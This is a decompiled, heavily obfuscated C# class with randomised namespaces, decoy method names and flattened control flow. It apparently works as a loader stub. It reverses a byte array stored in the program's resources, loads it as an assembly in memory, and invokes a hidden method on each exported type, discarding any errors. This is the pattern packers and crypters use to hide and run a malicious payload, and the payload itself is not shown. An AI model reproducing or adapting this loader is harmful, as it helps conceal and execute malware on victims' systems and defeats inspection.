using System;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using Zbawmbnkfyxecxwmbji.Pages;
using Zbawmbnkfyxecxwmbji.Properties;

namespace Zbawmbnkfyxecxwmbji.Candidates;

public class StatusCandidate : SpecificationVisitorPage
{
	private static StatusCandidate SelectThread;

	public void VisitMock()
	{
		int num = 2;
		Type type = default(Type);
		int num3 = default(int);
		while (true)
		{
			Type[] exportedTypes = ((Assembly)PublishThread(SearchMock())).GetExportedTypes();
			int num2 = 1;
			if (_003CModule_003E_007Bd068f09c_002D2c3d_002D4560_002Dba52_002Dc616a3f74e5e_007D.m_608d384c85784b1d90209d0b2ac0f372 == 0)
			{
				goto IL_0027;
			}
			goto IL_0056;
			IL_0056:
			num2 = num;
			goto IL_0027;
			IL_0027:
			while (true)
			{
				switch (num2)
				{
				case 2:
					break;
				case 4:
					type = exportedTypes[num3];
					num2 = 0;
					if (_003CModule_003E_007Bd068f09c_002D2c3d_002D4560_002Dba52_002Dc616a3f74e5e_007D.m_fc57f65539dc48bea0c293791e96c061 != 0)
					{
						continue;
					}
					goto IL_0056;
				case 3:
					if (num3 >= exportedTypes.Length)
					{
						return;
					}
					goto case 4;
				case 1:
					num3 = 0;
					goto case 3;
				default:
					try
					{
						type.InvokeMember("H6WKvXRCwP", BindingFlags.InvokeMethod, null, null, null);
					}
					catch
					{
					}
					num3++;
					num2 = 3;
					if (_003CModule_003E_007Bd068f09c_002D2c3d_002D4560_002Dba52_002Dc616a3f74e5e_007D.m_e9ee27e866354f2889fbf395dd9cb13e == 0)
					{
						continue;
					}
					goto IL_0056;
				}
				break;
			}
		}
	}

	[SpecialName]
	private byte[] SearchMock()
	{
		return Resources.Yurrvynnpzxmiozcprgtey.Reverse().ToArray();
	}

	internal static object PublishThread(object object_0)
	{
		return Assembly.Load((byte[])object_0);
	}

	internal static bool ConnectThread()
	{
		return SelectThread == null;
	}

	internal static StatusCandidate CountThread()
	{
		return SelectThread;
	}
}
